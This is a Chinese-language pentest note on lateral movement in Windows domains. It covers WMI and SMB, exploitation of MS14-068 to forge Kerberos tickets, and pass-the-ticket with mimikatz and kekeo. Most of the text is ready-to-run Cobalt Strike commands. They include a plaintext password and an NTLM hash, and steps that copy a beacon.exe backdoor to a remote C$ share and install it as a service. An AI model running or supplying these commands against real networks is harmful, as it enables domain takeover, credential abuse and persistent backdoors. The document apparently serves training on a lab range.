# wmi 横向移动
## 什么是 wmi
  **<font style="color:#DF2A3F;">WMI 全称“windows 管理规范”</font>**，从 Win2003 开始一直存在，它原本的作用是方便管理员对 windows 主机进行管理，因此在内网渗透中，我们可以使用 WMI 进行横向移动，支持用户名明文或者 hash 的方式进行认证，**<font style="color:#DF2A3F;">并且该方法不会在目标日志系统留下痕迹。</font>**

**<font style="color:#DF2A3F;"></font>**

**利用条件：**

1. WMI 服务开启，端口 135，默认开启
2. 防火墙允许 135、445 等端口通信
3. 知道目标机的账户密码或 hash

# smb 横向移动
## 什么是 smb
  SMB 服务通常由文件服务器提供，它允许客户端计算机通过网络访问服务器上的共享资源。通过 SMB 用户可以在网络上访问和共享文件夹、文件以及打印机，从而实现在不同计算机之间方便地共享数据和打印输出。利用 SMB 可通过明文或 HASH 传递来远程执行。



利用条件：

1. 文件与打印机服务开启，默认开启
2. 防火墙允许 135、445 等端口通信
3. 知道目标机的账户密码或 hash

### MS14-068 漏洞-利用漏洞生成的用户的新身份票据尝试认证
MS14-068 是密钥分发中心（KDC）服务中的 Windows 漏洞。它允许经过身份验证的用户在其 Kerberos 票证（TGT）中插入任意 PAC。该漏洞位于 kdcsvc.dll 域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的 PAC 的 Kerberos TGT 来获得票证。



1. **<font style="color:#117CEE;">获取SID值:</font>**<font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">shell whoami/user</font>`



2. 先在 cs 上把工具 ms14-068.exe 传到目标机上，然后**<font style="color:#117CEE;">生成票据文件:</font>**<font style="color:rgb(0, 0, 0);"> </font>

`<font style="color:rgb(0, 0, 0);">shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45</font>`<font style="color:rgb(0, 0, 0);"> </font>

<font style="color:rgb(0, 0, 0);"></font>

3. **<font style="color:#117CEE;">清除票据连接: </font>**`<font style="color:rgb(0, 0, 0);">shell klist purge</font>`

**<font style="color:#117CEE;"></font>**

4. **<font style="color:#117CEE;">内存导入票据:</font>**<font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">mimikatz kerberos::ptc TGT_webadmin@god.org.ccache</font>`<font style="color:rgb(0, 0, 0);"> </font>

<font style="color:rgb(0, 0, 0);">连接目标上线: </font>

```bash
shell dir \\OWA2010CN-GOD\c$ 
shell net use \\OWA2010CN-GOD\C$ 
copy beacon.exe \\OWA2010CN-GOD\C$  //copy一个后门到目标C盘
sc \\OWA2010CN-GOD create bindshell binpath= "c:\beacon.exe"  //创建一个服务
sc \\OWA2010CN-GOD start bindshell  //启动服务bindshell
```



然后 connect，就可以成功上线了



tip： 这种方法成功与否取决于目标机漏洞有没有打补丁





### 使用工具 kekeo（高权限，需 HTLM）
利用获取的 NTLM 生成新的票据尝试认证。因为当前主机之前与其他主机连接过，所以本地应该生成了一些票据，我们可以导出这些票据，然后再导入票据，利用。该方法类似于 cookie 欺骗。也需要先上传到目标机上再使用。



缺点：票据是有有效期的，所以如果当前主机在连接过域控的话，有效期内可用



**<font style="color:#DF2A3F;">生成票据:</font>**` shell kekeо "tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7" "exit"`

**<font style="color:#DF2A3F;"></font>**

**<font style="color:#DF2A3F;">导入票据:</font>** `shell kekeо "kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi" "exit"`

**<font style="color:#DF2A3F;"></font>**

**<font style="color:#DF2A3F;">查看票据:</font>** `shell klist`

**<font style="color:#DF2A3F;"></font>**

**<font style="color:#DF2A3F;">利用票据连接:</font>** `shell dir \\owa2010cn-god\c$`
